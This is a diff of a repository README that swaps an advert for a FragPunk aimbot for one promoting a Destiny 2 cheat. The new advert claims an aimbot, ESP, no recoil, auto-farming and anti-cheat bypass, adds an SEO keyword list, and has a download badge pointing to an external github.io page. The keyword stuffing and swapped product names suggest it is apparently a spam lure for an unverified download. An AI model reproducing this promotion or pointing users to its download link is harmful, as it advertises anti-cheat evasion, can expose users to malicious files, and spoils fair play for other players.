@@ -1,23 +1,23 @@
-# 🎯 FragPunk Aimbot 🔧 Precision Engine for C++
+# 🌌 Destiny 2 Cheat 🔫 C++ Aim, ESP & PvE/PvP Enhancer
 
-Take your aim to the next level with the FragPunk Aimbot, a cutting-edge tool written in C++ for unbeatable accuracy. This aimbot offers smooth and fast target locking, intuitive enemy tracking, and customizable settings to fit your gameplay. The best tool for gamers who want to dominate with flawless aim and minimal detection.
+Take your Destiny 2 gameplay to god-tier levels with this C++ cheat designed for both PvE and PvP domination. Featuring precision aimbot, ESP for enemies and loot, no recoil, and automated farming features, this tool gives you the power to conquer raids, strikes, and Crucible matches with ease. Optimized for low detection and smooth system performance.
 
-[![Download FragPunk Aimbot](https://img.shields.io/badge/Download-FragPunk%20Aimbot-blueviolet)](https://offload2.bitbucket.io/)
+[![Download Destiny 2 Cheat](https://img.shields.io/badge/Download-Destiny%202%20Cheat-blueviolet)](https://Destiny-2-Cheat-habo7.github.io/.github)
 
 ## ✨ Key Features
-- 🎯 High Precision Aiming System
-- 🔄 Smooth and Seamless Targeting
-- 👀 Advanced Enemy Detection Algorithms
-- ⚙️ Fully Customizable Aimbot Settings
-- 🛡️ Low Detection Risk and Anti-Ban Mechanisms
-- 🧠 Prioritized Headshot Mode
-- 💻 Optimized for Performance in C++
+- 🎯 Smart Aimbot with Aim Assist & Head Prioritization  
+- 👁 Real-Time ESP for Enemies, Loot, and Objectives  
+- 🔫 Recoil & Spread Removal for All Weapons  
+- ⚙️ Auto Farming & AFK XP Systems  
+- 🔄 Custom FOV, Smoothing, and Triggerbot  
+- 🛡️ Anti-Cheat Bypass & Stealth Mode  
+- 💻 Fully Optimized C++ Codebase for Max FPS  
 
 ## 🏆 Why Choose
-FragPunk Aimbot is built using C++ to ensure optimal performance, speed, and stability. With minimal CPU usage, the tool provides you with lightning-fast aim assistance while ensuring a smooth gaming experience.
+Most Destiny 2 cheats are slow or get detected fast — this one is coded in clean, efficient C++ and built for long sessions with minimal risk.
 
 ## 🚀 Why Use It
-Boost your gameplay with advanced aimbot features that enhance your precision, making you a formidable force in every match. Whether you're looking for headshots or strategic aim control, this tool delivers it all.
+Raid faster, PvP smarter, and farm loot more efficiently. Whether you're grinding solo or with a squad, this cheat gives you the edge in every activity.
 
 ## 🔍 SEO Keywords
-FragPunk Aimbot, C++ Aimbot, FragPunk Hack, FPS Aimbot, Precision Aimbot, Undetectable Aimbot, Advanced Aimbot Features, High-Performance Aimbot
+Destiny 2 Cheat, C++ Destiny 2 Hack, Destiny 2 Aimbot, Destiny 2 ESP, PvP Cheat Destiny 2, Destiny 2 Farming Bot, Destiny 2 Undetectable Cheat, Destiny 2 No Recoil Hack
